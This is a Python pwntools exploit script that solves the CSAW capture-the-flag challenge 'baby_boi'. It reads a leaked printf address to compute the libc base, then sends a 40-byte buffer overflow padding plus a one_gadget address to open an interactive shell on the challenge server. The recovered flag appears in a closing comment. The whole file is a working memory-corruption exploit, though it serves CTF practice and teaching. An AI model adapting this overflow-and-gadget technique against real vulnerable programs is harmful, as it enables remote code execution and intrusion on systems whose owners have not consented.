from pwn import *

#conn = process("./baby_boi")
conn = remote("pwn.chal.csaw.io", 1005)

libc	    = ELF('./libc-2.27.so')
libc_printf = libc.symbols['printf']
print "Printf offset: "+hex(libc_printf)

conn.recvuntil("Here I am: ")

actual_addr = int(conn.recvuntil("\n")[:-1],16)
print "Actual addr: "+hex(actual_addr)

system_gadget = 0x10a38c #Found with one_gadget

actual_gadget = actual_addr-libc_printf+system_gadget
print "Actual gadget: "+hex(actual_gadget)

payload = "A"*40+p64(actual_gadget)

conn.sendline(payload)

conn.interactive()

#flag{baby_boi_dodooo_doo_doo_dooo}